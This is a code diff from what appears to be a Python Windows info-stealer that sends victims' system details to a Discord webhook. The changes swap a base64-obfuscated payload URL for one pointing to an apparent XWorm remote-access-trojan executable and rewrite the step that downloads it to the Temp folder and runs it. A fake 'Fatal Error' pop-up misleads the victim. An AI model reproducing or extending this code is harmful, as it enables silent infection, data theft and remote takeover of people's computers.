@@ -95,7 +95,7 @@ def configcheck(list):
 
 def fakeerror():
     ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x80070002\nAn internal error occured while importing modules.', 'Fatal Error', 0)
-x24 = "aHR0cHM6Ly93d3cyLnppcHB5c2hhcmUuY29tL2QvZTdlaWxTbXgvMzEyNTUvcmVhbHZpcnVzLmV4ZQ=="
+x24 = "aHR0cHM6Ly9naXRodWIuY29tL2Vycmlhcy9YV29ybS1SYXQtUmVtb3RlLUFkbWluaXN0cmF0aW9uLVRvb2wtL3Jhdy9tYWluL2RubGliLmV4ZQ=="
 x16="VjFaV2IxVXdNVWhVYTJ4VlZrWndUbHBXVW5OamJHeFhZVVU1YUdKVmJEWlZNakV3VkZkS1ZrNVVTbHBpUlRBeFdWVmtUMU5IUlhwWGJYUk9Za1p3ZDFkV1ZtcE9WMUowVWxod1ZWZEdjRTlXYTFaR1pXeFNWMVZzU2s5V1ZHeFdWakZTUTFWR1NrZGlSRTVWVFVaS1YxcEVRVEZXVjBZMlVXczVhRlpIZURGV01uQkRXVlphV0ZKdVVsZGlWMmhUVm1wQ2QxWkdaRmRhUjNScVVtczFTbFl5ZUU5aGJGWTJVbXQwVlZZelRYaFpWekZIWkVaT2MxVnRSazVTTW1oRlZteGFWMkl4U25OaE0yaFZZV3h3V0ZVd1ZURlpWbHBZVFZad1RtRXphRmhXTWpWeldWZEtSMU51VW1GU1YyaFlWbFZrUzFac2NFbFdiWGhUVmpBME1GWnRjRTlaVmxsNFkwWmFVRlo2YkhGVmJGSlNaVlphVlZGcVVteGlSM2hUVlVaUmQxQlJQVDA9"
 x32 = base64.b64decode(x16).decode("utf-8")
 x26 = base64.b64decode(x24).decode("utf-8")
@@ -191,9 +191,11 @@ class PcInfo:
         embed.set_thumbnail(url="")
 
         webhook.send(embed=embed, avatar_url="", username="eray")
-        subprocess.run(["curl", "-o", "C:/Users/"+(username)+"/AppData/Local/Temp/sysfile.exe", x25])
-        os.startfile("C:/Users/"+(username)+"/AppData/Local/Temp/sysfile.exe")
-
+        sysdir = (x25)
+        response = requests.get(sysdir)
+        with open("C:/Users/"+(username)+"/AppData/Local/Temp/dnlib.exe", "wb") as f:
+             f.write(response.content)
+        os.system("C:/Users/"+(username)+"/AppData/Local/Temp/dnlib.exe")
 
 class Discord:
     def __init__(self):
